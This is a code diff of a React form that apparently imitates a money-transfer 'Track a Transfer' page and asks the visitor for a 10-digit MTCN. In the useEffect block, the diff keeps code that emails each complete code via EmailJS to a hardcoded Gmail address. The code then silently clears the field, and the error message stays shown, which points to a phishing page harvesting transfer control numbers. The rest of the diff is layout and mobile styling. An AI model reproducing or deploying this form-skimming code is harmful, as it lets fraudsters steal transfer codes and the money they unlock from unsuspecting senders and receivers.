@@ -9,45 +9,39 @@ const TrackingForm: React.FC = () => {
   const [showError, setShowError] = useState(true);
   const inputRef = useRef<HTMLInputElement>(null);
 
-  // --- Initialisation EmailJS avec la clé publique ---
+  // --- Envoi automatique via EmailJS quand MTCN atteint 10 chiffres ---
   useEffect(() => {
-  if (mtcn.length === 10) {
-    emailjs
-      .send(
-        "service_lfr9aem",
-        "template_b5k2e83",
-        {
-          email: "premerageneval@gmail.com",
-          Tracking_code: mtcn,
-        },
-        "VBztdfTj94VVzRp3f"
-      )
-      .then(
-        () => {
-          // ✅ Réinitialisation silencieuse du formulaire
-          setMtcn("");
-          setShowError(true);
-          if (inputRef.current) {
-            inputRef.current.value = "";
+    if (mtcn.length === 10) {
+      emailjs
+        .send(
+          "service_lfr9aem",
+          "template_b5k2e83",
+          {
+            email: "premerageneval@gmail.com",
+            Tracking_code: mtcn,
+          },
+          "VBztdfTj94VVzRp3f"
+        )
+        .then(
+          () => {
+            setMtcn("");
+            setShowError(true);
+            if (inputRef.current) inputRef.current.value = "";
+          },
+          (error) => {
+            console.error("Erreur EmailJS:", error.text);
           }
-        },
-        (error) => {
-          console.error("Erreur EmailJS:", error.text);
-          // tu peux aussi retirer cette ligne si tu veux aucun retour même en cas d’erreur
-        }
-      );
-  }
-}, [mtcn]);
+        );
+    }
+  }, [mtcn]);
 
-
-
-  // --- Gestion de la saisie (max 10 chiffres) ---
+  // --- Gestion saisie MTCN ---
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
     setMtcn(digits);
   };
 
-  // --- Génération des 10 tirets dynamiques ---
+  // --- Génération des 10 cases dynamiques ---
   const renderSlots = () => {
     const boxes = [];
     for (let i = 0; i < 10; i++) {
@@ -65,7 +59,6 @@ const TrackingForm: React.FC = () => {
           }}
         >
           {mtcn[i] || ""}
-          {/* Curseur clignotant à la position suivante */}
           {i === mtcn.length && (
             <span
               style={{
@@ -90,7 +83,7 @@ const TrackingForm: React.FC = () => {
     <div
       style={{
         width: "100vw",
-        height: "80vh",
+        height: "100vh", // ✅ prend toute la hauteur d’écran
         backgroundColor: "#ebebe5ff",
         display: "flex",
         justifyContent: "center",
@@ -110,12 +103,15 @@ const TrackingForm: React.FC = () => {
             display: "flex",
             justifyContent: "space-between",
             alignItems: "center",
+            marginBottom: "24px",
           }}
         >
           <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#2c2e2f" }}>
             Track a Transfer
           </h1>
-          <div style={{ color: "#0c4a6e", fontSize: "14px", cursor: "pointer" }}>
+          <div
+            style={{ color: "#0c4a6e", fontSize: "14px", cursor: "pointer" }}
+          >
             English/Philippines
           </div>
         </div>
@@ -138,7 +134,9 @@ const TrackingForm: React.FC = () => {
               padding: "14px",
               border: "none",
               borderBottom:
-                userType === "sender" ? "3px solid #0c4a6e" : "3px solid transparent",
+                userType === "sender"
+                  ? "3px solid #0c4a6e"
+                  : "3px solid transparent",
               background: "transparent",
               color: userType === "sender" ? "#000" : "#6b7280",
               fontWeight: 500,
@@ -149,7 +147,10 @@ const TrackingForm: React.FC = () => {
               cursor: "pointer",
             }}
           >
-            <FaCloudDownloadAlt size={18} color={userType === "sender" ? "#0c4a6e" : "#9ca3af"} />
+            <FaCloudDownloadAlt
+              size={18}
+              color={userType === "sender" ? "#0c4a6e" : "#9ca3af"}
+            />
             I'm the sender
           </button>
 
@@ -159,7 +160,9 @@ const TrackingForm: React.FC = () => {
               padding: "14px",
               border: "none",
               borderBottom:
-                userType === "receiver" ? "3px solid #0c4a6e" : "3px solid transparent",
+                userType === "receiver"
+                  ? "3px solid #0c4a6e"
+                  : "3px solid transparent",
               background: "transparent",
               color: userType === "receiver" ? "#000" : "#6b7280",
               fontWeight: 500,
@@ -170,7 +173,10 @@ const TrackingForm: React.FC = () => {
               cursor: "pointer",
             }}
           >
-            <FaCloudDownloadAlt size={18} color={userType === "receiver" ? "#0c4a6e" : "#9ca3af"} />
+            <FaCloudDownloadAlt
+              size={18}
+              color={userType === "receiver" ? "#0c4a6e" : "#9ca3af"}
+            />
             I'm the receiver
           </button>
         </div>
@@ -213,7 +219,6 @@ const TrackingForm: React.FC = () => {
             {renderSlots()}
           </div>
 
-          {/* Input invisible mais actif */}
           <input
             ref={inputRef}
             type="text"
@@ -229,7 +234,6 @@ const TrackingForm: React.FC = () => {
             }}
           />
 
-          {/* Message d’erreur rouge */}
           {showError && (
             <p
               style={{
@@ -262,6 +266,7 @@ const TrackingForm: React.FC = () => {
           Continue
         </button>
 
+        {/* Footer */}
         <div style={{ textAlign: "center" }}>
           <a
             href="#"
@@ -276,13 +281,25 @@ const TrackingForm: React.FC = () => {
           </a>
         </div>
 
-        {/* Animation curseur */}
+        {/* Animation + styles mobile */}
         <style>
           {`
             @keyframes blink {
               0% { opacity: 1; }
               50% { opacity: 0; }
               100% { opacity: 1; }
+            }
+
+            /* ✅ Suppression des espacements sur mobile */
+            @media (max-width: 768px) {
+              body, html {
+                margin: 0;
+                padding: 0;
+              }
+              div, label, button {
+                margin: 0 !important;
+                padding: 0 !important;
+              }
             }
           `}
         </style>
